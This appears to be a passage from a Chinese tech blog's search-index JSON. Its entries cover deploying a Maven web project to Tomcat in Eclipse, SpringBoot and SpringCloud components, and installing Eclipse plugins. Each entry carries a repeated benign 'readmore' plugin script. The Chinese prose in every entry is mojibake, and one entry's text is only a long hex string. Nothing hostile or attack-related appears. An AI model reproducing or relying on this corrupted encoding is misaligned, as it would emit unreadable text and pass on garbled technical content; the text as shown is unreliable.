æœåŠ¡å™¨æ‰€åœ¨çš„ä½ç½®ï¼Œæœ€åç‚¹å‡» Finish -&gt; Apply and Close æŒ‰é’® éƒ¨ç½²é¡¹ç›®åˆ° Tomcat æœåŠ¡å™¨åˆ›å»ºæœ¬åœ°çš„ Tomcat æœåŠ¡å™¨ é€‰æ‹© Tomcat æœåŠ¡å™¨çš„ç›®æ ‡ç‰ˆæœ¬ï¼Œå¹¶é€‰ä¸­ä¸Šé¢å·²åˆ›å»ºçš„ Tomcat è¿è¡Œç¯å¢ƒ å°†é¡¹ç›®ç§»åŠ¨åˆ°æœ¬åœ°çš„ Tomcat æœåŠ¡å™¨ ç‚¹å‡» Finish æŒ‰é’®å®Œæˆé…ç½® Tomcat æœåŠ¡å™¨è¿è¡Œ Web é¡¹ç›®é€‰ä¸­é¡¹ç›® -&gt; å³å‡» -&gt; Run As -&gt; Run on Server -&gt; é€‰æ‹©æœ¬åœ°çš„ Tomcat æœåŠ¡å™¨ -&gt; Finish é¡¹ç›®æˆåŠŸå¯åŠ¨åï¼ŒEclipse çš„æ§åˆ¶å°ä¼šè¾“å‡ºå¦‚ä¸‹çš„æ—¥å¿—ä¿¡æ¯ æ‰“å¼€æµè§ˆå™¨è®¿é—® http://localhost:8080/ssm-studyï¼Œå…¶ä¸­çš„ ssm-study æ˜¯é¡¹ç›®åç§° æœ€ç»ˆçš„é¡¹ç›®ç›®å½•ç»“æ„ å‚è€ƒåšå®¢ Eclipse åˆ›å»º Maven çš„ Web é¡¹ç›® ä½¿ç”¨ Eclipse åˆ›å»º Maven çš„ Web é¡¹ç›® var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"å¼€å‘å·¥å…·"},{title:"SpringBoot ä¸ SpringCloud ä»‹ç»",url:"/posts/cd6beb9c.html",text:'SpringBootSpringBoot ç«™ç‚¹ SpringBoot å®˜ç½‘ SpringBoot å®˜æ–¹æ–‡æ¡£ SpringBoot Github é¡¹ç›® SpringBoot ç¤ºä¾‹æºç  SpringBoot ç‰¹æ€§ åˆ›å»ºç‹¬ç«‹çš„ Spring åº”ç”¨ç¨‹åº åµŒå…¥çš„ Tomcatï¼Œæ— éœ€éƒ¨ç½² WAR æ–‡ä»¶ï¼Œé€‚ç”¨äºå‡†ç”Ÿäº§ç¯å¢ƒ ç®€åŒ– Maven é…ç½® è‡ªåŠ¨é…ç½® Spring æä¾›ç”Ÿäº§å°±ç»ªå‹åŠŸèƒ½ï¼Œå¦‚æŒ‡æ ‡ã€å¥åº·æ£€æŸ¥ã€å¤–éƒ¨é…ç½® å¼€ç®±å³ç”¨ï¼Œæ— éœ€ XML é…ç½® SpringBoot æ ¸å¿ƒæ¨¡å— spring-boot spring-boot-autoconfigure spring-boot-starters spring-boot-cli spring-boot-actuator spring-boot-actuator-autoconfigure spring-boot-test spring-boot-test-autoconfigure spring-boot-loader spring-boot-devtools SpringCloudSpringCloud ç«™ç‚¹ SpringCloud Github SpringCloud å®˜æ–¹æ–‡æ¡£ SpringCloud ä¸­æ–‡æ–‡æ¡£ SpringCloud ä¸­å›½ç¤¾åŒº SpringCloud å­¦ä¹ èµ„æº SpringCloud æ•™ç¨‹æºç  SpringCloud ç¤ºä¾‹æºç  SpringCloud æ˜¯ä»€ä¹ˆSpringCloud æ˜¯ä¸€ç³»åˆ—æ¡†æ¶çš„æœ‰åºé›†åˆã€‚å®ƒåˆ©ç”¨ SpringBoot çš„å¼€å‘ä¾¿åˆ©æ€§å·§å¦™åœ°ç®€åŒ–äº†åˆ†å¸ƒå¼ç³»ç»ŸåŸºç¡€è®¾æ–½çš„å¼€å‘ï¼Œå¦‚æœåŠ¡å‘ç°æ³¨å†Œã€é…ç½®ä¸­å¿ƒã€æ¶ˆæ¯æ€»çº¿ã€è´Ÿè½½å‡è¡¡ã€æ–­è·¯å™¨ã€æ•°æ®ç›‘æ§ç­‰ï¼ŒåŒæ—¶å¾ˆæ–¹ä¾¿åšåˆ°ä¸€é”®å¯åŠ¨å’Œéƒ¨ç½²ã€‚SpringCloud å¹¶æ²¡æœ‰é‡å¤åˆ¶é€ è½®å­ï¼Œå®ƒåªæ˜¯å°†ç›®å‰å„å®¶å…¬å¸å¼€å‘çš„æ¯”è¾ƒæˆç†Ÿã€ç»å¾—èµ·å®é™…è€ƒéªŒçš„æœåŠ¡æ¡†æ¶ç»„åˆèµ·æ¥ï¼Œé€šè¿‡ SpringBoot é£æ ¼è¿›è¡Œå†å°è£…å±è”½æ‰äº†å¤æ‚çš„é…ç½®å’Œå®ç°åŸç†ï¼Œæœ€ç»ˆç»™å¼€å‘è€…ç•™å‡ºäº†ä¸€å¥—ç®€å•æ˜“æ‡‚ã€æ˜“éƒ¨ç½²å’Œæ˜“ç»´æŠ¤çš„åˆ†å¸ƒå¼ç³»ç»Ÿå¼€å‘å·¥å…·åŒ…ã€‚å…¶ä¸­ SpringCloud ä¸ºå¼€å‘äººå‘˜æä¾›äº†å¿«é€Ÿæ„å»ºåˆ†å¸ƒå¼ç³»ç»Ÿä¸­ä¸€äº›å¸¸è§æ¨¡å¼çš„å·¥å…·ï¼ˆä¾‹å¦‚é…ç½®ç®¡ç†ï¼ŒæœåŠ¡å‘ç°ï¼Œæ–­è·¯å™¨ï¼Œæ™ºèƒ½è·¯ç”±ï¼Œå¾®ä»£ç†ï¼Œæ§åˆ¶æ€»çº¿ï¼Œä¸€æ¬¡æ€§ä»¤ç‰Œï¼Œå…¨å±€é”å®šï¼Œé¢†å¯¼é€‰ä¸¾ï¼Œåˆ†å¸ƒå¼ä¼šè¯ï¼Œé›†ç¾¤çŠ¶æ€ï¼‰ã€‚å®ƒä»¬é€‚ç”¨äºä»»ä½•åˆ†å¸ƒå¼ç¯å¢ƒï¼ŒåŒ…æ‹¬å¼€å‘äººå‘˜è‡ªå·±çš„ç¬”è®°æœ¬ç”µè„‘ï¼Œè£¸æœºæ•°æ®ä¸­å¿ƒå’Œ Cloud Foundry ç­‰æ‰˜ç®¡å¹³å°ã€‚ SpringBoot ä¸ SpringCloud çš„å…³ç³» SpringBoot ä¸“æ³¨äºå¿«é€Ÿã€æ–¹ä¾¿çš„å¼€å‘å•ä¸ªå¾®æœåŠ¡ä¸ªä½“ï¼ŒSpringCloud åˆ™å…³æ³¨å…¨å±€çš„æœåŠ¡æ²»ç† SpringCloud å°† SpringBoot å¼€å‘çš„ä¸€ä¸ªä¸ªå•ä½“å¾®æœåŠ¡æ•´åˆå¹¶ç®¡ç†èµ·æ¥ï¼Œä¸ºå„ä¸ªå¾®æœåŠ¡ä¹‹é—´æä¾›é…ç½®ç®¡ç†ã€æœåŠ¡å‘ç°ã€æ–­è·¯å™¨ã€è·¯ç”±ã€å¾®ä»£ç†ã€äº‹ä»¶æ€»çº¿ã€å…¨å±€é”ã€å†³ç­–ç«é€‰ã€åˆ†å¸ƒå¼ä¼šè¯ç­‰é›†æˆçš„æœåŠ¡ SpringBoot å¯ä»¥ç¦»å¼€ SpringCloud ç‹¬ç«‹ä½¿ç”¨å¼€å‘é¡¹ç›®ï¼Œä½†æ˜¯ SpringCloud ç¦»ä¸å¼€ SpringBootï¼Œå±äºä¾èµ–çš„å…³ç³» SpringCloud ç»„ä»¶SpringCloud æä¾›ä¸€æ•´å¥—çš„å¾®æœåŠ¡è§£å†³æ–¹æ¡ˆï¼Œç”Ÿæ€å†…å¤§æ¦‚æœ‰ 21 ä¸ªç»„ä»¶ï¼›å¤§è‡´å¯åˆ†æˆä¸¤ç±»ï¼Œä¸€ç±»æ˜¯å¯¹ç°æœ‰æˆç†Ÿæ¡†æ¶ â€SpringBoot åŒ–â€ çš„å°è£…å’ŒæŠ½è±¡ï¼Œä¹Ÿæ˜¯æ•°é‡æœ€å¤šçš„é¡¹ç›®ï¼›ç¬¬äºŒç±»æ˜¯å¼€å‘äº†ä¸€éƒ¨åˆ†åˆ†å¸ƒå¼ç³»ç»Ÿçš„åŸºç¡€è®¾æ–½çš„å®ç°ï¼Œå¦‚ Spring Cloud Stream æ‰®æ¼”çš„å°±æ˜¯ Kafkaã€ActiveMQ è¿™æ ·çš„è§’è‰²ã€‚å¯¹äºæƒ³å¿«é€Ÿå®è·µå¾®æœåŠ¡çš„å¼€å‘è€…æ¥è¯´ï¼Œç¬¬ä¸€ç±»ç»„ä»¶å°±å·²ç»è¶³å¤Ÿä½¿ç”¨ï¼Œå¦‚ï¼š Spring Cloud Netflixï¼Œæ˜¯å¯¹ Netflix å¼€å‘çš„ä¸€å¥—åˆ†å¸ƒå¼æœåŠ¡æ¡†æ¶çš„å°è£…ï¼ŒåŒ…æ‹¬æœåŠ¡çš„å‘ç°å’Œæ³¨å†Œï¼Œè´Ÿè½½å‡è¡¡ã€æ–­è·¯å™¨ã€REST å®¢æˆ·ç«¯ã€è¯·æ±‚è·¯ç”±ç­‰ Spring Cloud Configï¼Œå°†é…ç½®ä¿¡æ¯ä¸­å¤®åŒ–ä¿å­˜ï¼Œé…ç½® Spring Cloud Bus å¯ä»¥å®ç°åŠ¨æ€ä¿®æ”¹é…ç½®æ–‡ä»¶ Spring Cloud Busï¼Œåˆ†å¸ƒå¼æ¶ˆæ¯é˜Ÿåˆ—ï¼Œæ˜¯å¯¹ Kafkaã€MQ çš„å°è£… Spring Cloud Securityï¼Œå¯¹ Spring Security çš„å°è£…ï¼Œå¹¶èƒ½é…åˆ Netflix ä½¿ç”¨ Spring Cloud Zookeeperï¼Œå¯¹ Zookeeper çš„å°è£…ï¼Œä½¿ä¹‹èƒ½é…ç½®å…¶å®ƒ Spring Cloud çš„å­é¡¹ç›®ä½¿ç”¨ Spring Cloud Eurekaï¼Œæ˜¯ Spring Cloud Netflix å¾®æœåŠ¡å¥—ä»¶ä¸­çš„ä¸€éƒ¨åˆ†ï¼Œå®ƒåŸºäº Netflix Eureka åšäº†äºŒæ¬¡å°è£…ï¼Œä¸»è¦è´Ÿè´£å®Œæˆå¾®æœåŠ¡æ¶æ„ä¸­çš„æœåŠ¡æ²»ç†åŠŸèƒ½ SpringCloud å¸¸ç”¨ç»„ä»¶ Spring Cloud Configï¼šé…ç½®ç®¡ç†å¼€å‘å·¥å…·åŒ…ï¼Œå¯ä»¥è®©ä½ æŠŠé…ç½®æ”¾åˆ°è¿œç¨‹æœåŠ¡å™¨ï¼Œç›®å‰æ”¯æŒæœ¬åœ°å­˜å‚¨ã€Git ä»¥åŠ Subversion Spring Cloud Busï¼šäº‹ä»¶ã€æ¶ˆæ¯æ€»çº¿ï¼Œç”¨äºåœ¨é›†ç¾¤ï¼ˆä¾‹å¦‚ï¼Œé…ç½®å˜åŒ–äº‹ä»¶ï¼‰ä¸­ä¼ æ’­çŠ¶æ€å˜åŒ–ï¼Œå¯ä¸ Spring Cloud Config è”åˆå®ç°çƒ­éƒ¨ç½² Spring Cloud Netflixï¼šé’ˆå¯¹å¤šç§ Netflix ç»„ä»¶æä¾›çš„å¼€å‘å·¥å…·åŒ…ï¼Œå…¶ä¸­åŒ…æ‹¬ Eurekaã€Hystrixã€Zuulã€Archaius ç­‰ Netflix Eurekaï¼šäº‘ç«¯è´Ÿè½½å‡è¡¡ï¼Œä¸€ä¸ªåŸºäº REST çš„æœåŠ¡ï¼Œç”¨äºå®šä½æœåŠ¡ï¼Œä»¥å®ç°äº‘ç«¯çš„è´Ÿè½½å‡è¡¡å’Œä¸­é—´å±‚æœåŠ¡å™¨çš„æ•…éšœè½¬ç§» Netflix Hystrixï¼šå®¹é”™ç®¡ç†å·¥å…·ï¼Œæ—¨åœ¨é€šè¿‡æ§åˆ¶æœåŠ¡å’Œç¬¬ä¸‰æ–¹åº“çš„èŠ‚ç‚¹ï¼Œä»è€Œå¯¹å»¶è¿Ÿå’Œæ•…éšœæä¾›æ›´å¼ºå¤§çš„å®¹é”™èƒ½åŠ› Netflix Zuulï¼šè¾¹ç¼˜æœåŠ¡å·¥å…·ï¼Œæ˜¯æä¾›åŠ¨æ€è·¯ç”±ï¼Œç›‘æ§ï¼Œå¼¹æ€§ï¼Œå®‰å…¨ç­‰çš„è¾¹ç¼˜æœåŠ¡ Netflix Archaiusï¼šé…ç½®ç®¡ç† APIï¼ŒåŒ…å«ä¸€ç³»åˆ—é…ç½®ç®¡ç† APIï¼Œæä¾›åŠ¨æ€ç±»å‹åŒ–å±æ€§ã€çº¿ç¨‹å®‰å…¨é…ç½®æ“ä½œã€è½®è¯¢æ¡†æ¶ã€å›è°ƒæœºåˆ¶ç­‰åŠŸèƒ½ Spring Cloud for Cloud Foundryï¼šé€šè¿‡ Oauth2 åè®®ç»‘å®šæœåŠ¡åˆ° CloudFoundryï¼ŒCloudFoundry æ˜¯ VMware æ¨å‡ºçš„å¼€æº PaaS äº‘å¹³å° Spring Cloud Sleuthï¼šæ—¥å¿—æ”¶é›†å·¥å…·åŒ…ï¼Œå°è£…äº† Dapperã€Zipkin å’Œ HTrace æ“ä½œ Spring Cloud Data Flowï¼šå¤§æ•°æ®æ“ä½œå·¥å…·ï¼Œé€šè¿‡å‘½ä»¤è¡Œæ–¹å¼æ“ä½œæ•°æ®æµ Spring Cloud Securityï¼šå®‰å…¨å·¥å…·åŒ…ï¼Œä¸ºä½ çš„åº”ç”¨ç¨‹åºæ·»åŠ å®‰å…¨æ§åˆ¶ï¼Œä¸»è¦æ˜¯æŒ‡ OAuth2 Spring Cloud Consulï¼šå°è£…äº† Consul æ“ä½œï¼ŒConsul æ˜¯ä¸€ä¸ªæœåŠ¡å‘ç°ä¸é…ç½®å·¥å…·ï¼Œä¸ Docker å®¹å™¨å¯ä»¥æ— ç¼é›†æˆ Spring Cloud Zookeeperï¼šæ“ä½œ Zookeeper çš„å·¥å…·åŒ…ï¼Œç”¨äºä½¿ç”¨ Zookeeper æ–¹å¼çš„æœåŠ¡æ³¨å†Œå’Œå‘ç° Spring Cloud Streamï¼šæ•°æ®æµæ“ä½œå¼€å‘åŒ…ï¼Œå°è£…äº†ä¸ Redisã€RabbitMQã€Kafka ç­‰å‘é€æ¥æ”¶æ¶ˆæ¯ Spring Cloud CLIï¼šåŸºäº Spring Boot CLIï¼Œå¯ä»¥è®©ä½ ä»¥å‘½ä»¤è¡Œæ–¹å¼å¿«é€Ÿå»ºç«‹äº‘ç»„ä»¶ SpringCloud ç»„ä»¶æ¦‚è§ˆå›¾ SpringCloud æ¶æ„å›¾é›†SpringCloud æ¶æ„å›¾ SpringCloud Alibaba æŠ€æœ¯ä¸­å°æ¶æ„å›¾ var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"å¾®æœåŠ¡"},{title:"Eclipse å®‰è£…æ’ä»¶",url:"/posts/5c9b0a47.html",text:'Eclipse åœ¨çº¿å®‰è£…é˜¿é‡Œå·´å·´ Java å¼€å‘è§„çº¦æ’ä»¶ æ‰“å¼€ Eclipse â€“&gt; Help â€“&gt; Install New Softwareï¼Œå¡«å†™æ’ä»¶çš„ URL åœ°å€ï¼š https://p3c.alibaba.com/plugin/eclipse/updateï¼Œ ç„¶åæ ¹æ®ç•Œé¢æç¤ºä¸€æ­¥æ­¥å®‰è£…ï¼Œæœ€åé‡å¯ Eclipseã€‚å®‰è£…æˆåŠŸåï¼Œå·¥å…·æ ä¼šæ–°å¢ä¸‹å›¾æ‰€ç¤ºçš„å›¾æ ‡ã€‚å¯ä»¥é€šè¿‡å³é”®èœå•ã€Toolbar æŒ‰é’®ä¸¤ç§æ–¹å¼æ‰‹åŠ¨è§¦å‘ä»£ç æ£€æµ‹ï¼ŒåŒæ—¶ç»“æœé¢æ¿ä¸­å¯ä»¥å¯¹éƒ¨åˆ†å®ç°äº† QuickFix åŠŸèƒ½çš„è§„åˆ™è¿›è¡Œå¿«é€Ÿä¿®å¤ã€‚ Eclipse åœ¨çº¿å®‰è£… SpringBoot æ’ä»¶ï¼ˆSpring Toolsï¼‰ æŸ¥çœ‹ Eclipse ç‰ˆæœ¬ï¼Œæ‰“å¼€ Eclipse â€“&gt; Help â€“&gt; About Eclipseã€‚ åœ¨ SpringBoot å®˜ç½‘ï¼Œæ ¹æ®è‡ªå·±çš„ Eclipse ç‰ˆæœ¬å·è·å–å¯¹åº”çš„æ’ä»¶ URL åœ°å€ã€‚ æ‰“å¼€ Eclipse â€“&gt; Help â€“&gt; Install New Softwareï¼Œå¡«å†™æ’ä»¶çš„ URL åœ°å€ï¼Œç‚¹å‡» SelectAll æŒ‰æ‰­é€‰æ‹©å®‰è£…æ‰€æœ‰ç»„ä»¶ï¼Œç„¶åå–æ¶ˆå·¦ä¸‹è§’ Cntact all update siteâ€¦ è¿™ä¸ªé€‰é¡¹çš„å‹¾é€‰ï¼Œå¦åˆ™å®‰è£…è¿‡ç¨‹ä¼šéå¸¸ç¼“æ…¢ã€‚å®‰è£…è¿‡ç¨‹ä¸­ï¼Œè‹¥æç¤ºä¸‹å›¾ä¸­çš„ç»„ä»¶æ›´æ–°ï¼Œç›´æ¥é€‰æ‹© Keep my installationï¼Œç„¶åæ ¹æ®ç•Œé¢æç¤ºä¸€æ­¥æ­¥å®‰è£…ï¼Œæœ€åé‡å¯ Eclipseã€‚ var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"å¼€å‘å·¥å…·"},{title:"å„ç§ç¼–ç¨‹è¯­è¨€çš„å¼€æºé¡¹ç›®æ”¶è—",url:"/posts/73a4d573.html",text:"4cfab7e4fdfd9afdbf1592f9652b8a194263aa6a7e6b4c103fbd9ff49c09b0448cdca81362464dc5686f95504da6299b6490ac25c35cdeb830b4ba7a9cf2685b305b92a3783836c75feaa53ad538edf334d360588c0d85fb1105cbe522a1700ead6bac62dd93ff5054ee8e5ddeff995e4f5b316d520e21c9d9e96b58b0b5a31292db9c42a290313bfbca2d61641cbecded9f516c85019f9b2e6f0f010518cc4de9dd9f21f776689e5efda84edb4934c1e77bfa1bc577d982e100b43d2679d1cd868c55d14370f089983a6f27432c41ace3dfe468e55097b9c5b4c08b9a7a1f50d4a46bae1becfa0cfdacd66b5ca846d4c08c88e7e68a47e5d6cad2511e6dcdaca5eeb813c01bbaddeea0fcc629ea71444d800997abd5fe4d6f47cec052ebd3b4479d4dd0beba9704b131b3a3c5e24fd1a55d8a65ffe4b795d21b5edea33fb69183a4804e726dca10901d750019cb9e05a776c994e504269109c210bc59272609ea4951c8db4c89f56c5a539fde383bdb9267d9e97940b3a3f6bb9392874111f189ae1e44fd5010a6be4e5cd25e62c854bd9a5ee48f6deeaa68bdc23eecbd2ef2b9a66c925d98b11b5471073a3fec9f76245cf6ac83647260bae1fcd37dbca4d7499712c2363c592047f47ced5102b6d525bfed3f493c705d18834fc727fcc46d33457fecf238e12e0edae412fb8b0840f65bd59faa1809ab8d63efe7ce8205749424498e63c3ea87d287519306777c5092992d83f88401225bcabb4f39c875a611e9c80a0bca15cf7ddb2cfcc1a4453618bb158a5e8ee5d98c94c7f36a104b6be2c3ddd49ab8391c588fb8100bf67df36663d09ba41bb493397194384f871189f0ebd60aed89a357d309850f57e99faf57cea76f7309dc67d25cb41ed1219d8093c23181d27e04706d3e4bc5d82f00e1f7d56967f3f0cbc7d2695a77ad8bc08c94ad2d9f9de66552a01c22b910e8e5f5f1ff00969f5aed25333f7bb5b7f9d6f27b6a14749dd93be97fa298a10d04eb188567b54e23a87303e7f1cce4065cea6a10e62704c83d1c344df2433bc4f9e09a76fb8ca01cb435adcb24df7e04ccc0b039147f656d45d70014091f4187c26cf019ba1b224830f23199d40c316e5eeee71c0cec05fefb873047db5d719a7f9793e17450fd8cdc46de71a04deaf8c96d229e677e3c11f08d8feac3c38b8d277a4ad0ea626bf4827ac838538496aadf12a9681a8edfc934644cbcbfdc03b15dd5a056656c0d58eafe91c3a220b686123cbe32e290c071a7d5060ae633ae13acb55a6992cb809702de9e01c8da61009fdae85649b569c43b9daf0fddb8e7fa1d3fbfdb2100bdbcbab114dc6b2790421b303ff33088d9e559590e46742902d669d215014417e9f945fb738cbffb314672129acdd5610bcc48d365c3ede693e2dd52cf193cf2077f577ffcbdafcfb10113992ac41bb64249842f867ac1caaddc5700a99b9f69decdc757d6a2755525230a15e9153d82cc24c6388371e7f111719364c13037047d202a405c8a20ddf7df6ab5a149594f011e6168efbac405f8d0340806862703cf165c1a20a724d2d361d8f060b2ce00bd3ec0f253f950011d59f51cf2a5a990f2b21efa2ba5c4ec4fedefd7d1df608b940fce83658a530fe887c0fe182a9785e6e4815175768b9379e3a88142115c3204c4bef620adbdbacaea9031370e0f6955ae715954c5e52ebc3422395400dab2e123e36439788027b253f346e6bf1e5154b63919c50b07999d7b6138783066de07c4ab289541c9ab5886f6bad4c2fda19a089cd6e6b49358b1988b9a92815702e298a2e7b5e5cb474ca5ed3f59062108353a0a9c9bd46952c4c93b75058ab12a9488301f7555e42ad501f3c2cd5d6493088f69ee418793ff0b03e6b894120486f6eee6491669ac1b5771f0284431d56a660fe1672a8fadc77fe048186187b927e2b41a75a3d24f407d0061334e3c1efa2a9c3e41e02d3868fbb50083681602ac15a6a2f70928c82382e13cfe33fb4c89fd390913d5f2ba53c42700f56335d9e8aaf43c7a1108f61c297fa49b4a969022c793d2acbdb98b612658a8bec70778b75f7f52024b0117f989681d839b0422057e175682d66fcdc849e15430dbb802990db220374e9a109cfbe6e432c64edb4590cf0f2e521beae249db9efce062068ac1e515eb5b226219b5e9a5993bb065ad1811602e536b523d5fffaec3f33016f25db4816932389d2b497117a55b12296543552829f33d9a30a808c388ef334bbace9e240228decccf1ea3c94eea2dbc14c5373e8e1a39e0f0e9e399935e0a13619f2531654e491aa5498fe21ab3482d3e8a246a3ea67168b24b2298e9b5a937cd9f23b4d24ed0dfefda2d90a3e9905e69a776ac3de615680836b4730efb27bf54779ffff12eeda391b77ddca445b3ea8aff5ef133e487b0c1ff06249a9ff180a4929795dda3cd80f974e00b05e7cf1a5bfaea7491fae6f6832f6949e1df281ef4506b1ca24e516d1e47bc6da2c12e34398d9e1d7e26a1f04df9d6037da2d36ee80e32c100ce2c9122d72c0a2ae30618e5ff95664b22d171c3765609dcf86fff1cc8ae6dc50404c7f17fe73cbf3cf72420b46246ee55b50d26e609e7a56c34856229ebbcbc2f56ec179804ac99e5b7aa8df1db64ec20e643f1257bbd9d7870206796702a6b119caac075fcb5e721bc6b87bc7b53df027e05b0b150f51b7af4892cd544d34f26260d7cf1668279f8f4364d0bcea58fc8f2fd25c0f728abb1c453ae09f3a6a3db11998ec062535e4d270398cb9cf4fc8e6c17595311051aa500a4ae8ac9489cbffed4af7cccf7f1140b82c7678882d124e7e61b6d1dd1c23d824d99d4296248e222a7319738b310e9d433e33975aa763caf2b6aaad05ab9bbdebfbdeef1e93fea6184f63bedfb9ce3993929964fdaf94c02126c8d4c854355c166331ebd74e401f0c35deace16e296e3c87938d546295c1cbb32396bdf24e83bdb08b170887329c8927a91c88a08741e6b93922eac31b897675ca99f6cc180fe09fd8ecaf9b8718676688e3da6b8860f74507dcfbe61d25de44abf66e662f4fe165ccea9f04f21175d2f79db5e72ac3ef51b0f78a83eff3c40790fd7c187bfcf3b0881ad147744e3930b1caee0359497c461c67186999fc9f544d96ebe12a3f6e4227b516b3a5b905dca1a68e4f0bb4b63d56b518e9d1e31e40844d8b92ccbab508a1709024745da03bb262011c71a1818bacc145f8efbfbf8e405746b28e8abf106511db7fa15874220b2f8615ac4c12be5fe3b56ef3bc46d229734950344821cc2774c3d293f28735a8de672c4e2f8a6172a30e3fbf27c98431e079f91b6ac6b5aca64bc162e0e10aaeb1bd9b3beac3e1685694a1c81a32af68c4273acef53be3842ff784285c41735e4c6776bd9bf16c0ed6e7d87da5250a04ea14a1cf1c22e67a0aee275654a34c740a3095730168c3a253c72d56152705a2a0cd22b3656913aa2aab6b62fcf1edeeb8c9b4d660fe438408fe0f640fc74d3438ee570dfca936e41dbd1be78c84d26451cef2853e71981babe1bc2fb1a3f6c617177a96c6423bb77a07f11f7451c8d0f1850414617410ab2b3a88ecb4e7856d0e0a8bf6932e7565ec1b759d196ca102a9597baf1fae247fefb1d44e14e887db79872fa88640c175e7489af3b2ffc670213a454fa3abf70102fad7f83b178f70a5b9000de97d1e038da09eb0a7fddec561319b8c5033193fcd44e1d4d7e6320b539882fd6558826d457724081564890b998f4a7d6a1a11ade95d48edd9a9a67dc1d0607e19ea43001710de83044eeb1982a7213dc4ade3f05f8fac8c6203223bfd5fb14408e7ae795803ee5b81a025f3319c2eb447cc377d27e10238cb6c22240f4b02b5e78f4033b551208bf517122a4fd5f1eca4f5d055f7d7bb003ee6d057c1b20db5240a95f4f55e8c13ced95775bb8960ac41f76ae93ee8b3056e3e72a78889449de95fcb11a46398a8ccfbb2925e0796d2a88d2165df37224ab6d6f4ae4c91d88c65de0de5315e8fc394edcacc38b0358e4f04db95558b33d68f63188d9e37334f2b8262146a0f2211cce24412cc3cab87fdd3b098a30ee7a5eed0bd9de26e1e8bbd3a832937d937f2fec4d27281f90cb8d7a0bfba4c00ad0d538744bce5c115b10c410ac419c63ab32a8fc1027d1fa06a84412516ea852aeb7ee95ffbb61e9cef68ea09ece8522b6ab2e5fce9a17a35078c16ee290457288936a8cf7f88e0517fabff6d26e99d7e7812e815a1dd14ee1b1579a72b793203cedf8a39b7f327ba4a0df8489a72dbbc2bab854e06791de2ca795dd5ee0b06ff4b044e5099fb6dcabddbb4891558446f24c3cddd34d3907e1a11c2c3967ff9023ed735821bd1bdd8dcaa651d369c70ea7ad01110222556f524971ad453b4e4995d44e3aa1cea4793d5d1317920b702b2bc901f3769aa63afe8eb31909301675989d977a0e23365b81807d6f1ab018be24f70188c8450e930df6cac7f82e77035ccd3e0966b44f4c429c6cf48c20cc45e4a429676abd4fbfa21c54a1d582f02b359d8c2d76ee4efac9fb989ce8ddf7a2bb124fa61efdd1dec9a74d1952ef9227aff62776773d808e1dfd47028117c3508358d3d39b4f04975b4c9456cb27295aea42f20795a3d161be8958225b101830c020595da858603ceb3744a8ff0587f93bbca3908c21cff5fafea92a99d339066ca39a6680ee1d5d599aabfdd5c81bb390375cf92671f4c63f871d8be74a942d15ae359c19f93056f15824f200c217c73952e426176b0820d892b14fa675b1da2734bafb145b8b992bda3513f5d76d4ff62019d044cf7c231a14c5d8f7d48297a95fe6d3bad4a949bcf252a13a81386079ed21fb360b7196aa5eb8cdcf2b1c99e7dbac574c1a87f7c8c269d06d9045af9129202718c4dc8495daf32915258a41eea4170742e88b108a86776692f3fdfd22abb54e070a5db958328a4324d7f40e2a556e0fd4098779049eb77864f5da185ac8283eed40e168beb5f87ad9e518e603c80629b670278ce973d0f63b95d3ad5e024dc432417e5f2bf8997a82301f1f98f26ffb89f7e5f176bfcaf536e0268e4b716a2cd609c62e34d36186e1f22edc95810255fe80dae4fcc23f8b8fa740bb2f21838c0b5b7c1678aa176b46c68843336b690d29a036274b77bb524eea9d6a5f452f52b69451c60a3e87ccede9f8a71f68823b8df28e26b6839f3f9123f00959e2df19598c41bed09615f83f2e7ce02d0bb6522874955c5a6df1d13b3f4e06e00170d155bc814222a1b9a89d242637ddc59a9a541b9e839537531684d18a85c7c28ad6c52e3032fd781ec39d76a66806bca2e143f21f17773d0ecf667999c3ad2c234b8474fd2c3002070b2a4938f3f9300454354f4f2c260c3a885c7f4be7f84d77bf2e2217c730e56c5a846d2527cc77e12971fc819e4daf80a518bc8b8952ddfb2cadcbf6ad7b8bfc7721f4aa035cc9c3a98cbb1874975a63f1eb55223fe0febc8fbd19ccc89d4885d4bdf49cd604b0405760452aba538c2dfe9f4d71906dd79bf816263e0292b53b64fd25ad1f200ab676e472488d164624a8ebf254cf81c6a979bda2e1b262674a727e7e50f8f03b04d17d625c5c45e0ef14d11bf8a4378ad9c61f90934c4cece652dc1163915f6843fac2a76205b68d516ac7787e4548d84704656d8b8fe935a48d7eeef4630275da06b2b3ea85d6798106b7c7dd3522d7ced256a965cf1f6f10578df046cf36f83619fffb75727137cc751afc3f08618430c3be7e0f3edc2c91e946d79026bc4646367e251e5a1759925